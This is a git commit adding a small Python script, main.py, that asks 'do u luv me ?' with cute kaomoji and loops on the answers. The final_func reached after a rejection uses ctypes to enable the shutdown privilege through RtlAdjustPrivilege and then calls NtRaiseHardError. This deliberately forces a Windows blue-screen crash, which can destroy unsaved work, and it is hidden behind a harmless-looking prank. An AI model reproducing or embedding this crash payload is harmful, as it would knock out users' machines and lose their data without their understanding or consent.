f9a807933890a45ea02f4d7468c8eb76aefc593c
thom <pvthom@proton.me>
2026-05-26 01:46:40 +0200

    Add files via upload

---
+++ main.py
@@ -0,0 +1,54 @@
+import os
+
+
+def ask():
+    print("(｡♥‿♥｡) do u luv me ?")
+    answer = input("> ").strip()
+
+    if answer == "yes":
+        yay()
+    elif answer == "no":
+        sure()
+    else:
+        ask()
+
+
+def yay():
+    print("ヽ(✿ﾟ▽ﾟ)ノ yayyy")
+    os.system("start yay.mp3")
+
+
+def sure():
+    print("(´・ω・｀) r u sure ?")
+    answer = input("> ").strip()
+
+    if answer == "no":
+        relief()
+    elif answer == "yes":
+        doom()
+    else:
+        sure()
+
+
+def relief():
+    print("ε-(´∀｀*) ah phew")
+    ask()
+
+
+def doom():
+    print("fine")
+    final_func()
+
+
+def final_func():
+    from ctypes import windll, c_int, c_uint, c_ulong, POINTER, byref
+
+    nullptr = POINTER(c_int)()
+
+    windll.ntdll.RtlAdjustPrivilege(c_uint(19), c_uint(1), c_uint(0), byref(c_int()))
+
+    windll.ntdll.NtRaiseHardError(c_ulong(0xDEADDEAD), c_ulong(0),\
+                                  nullptr, nullptr, c_uint(6), byref(c_ulong()))
+
+
+ask()
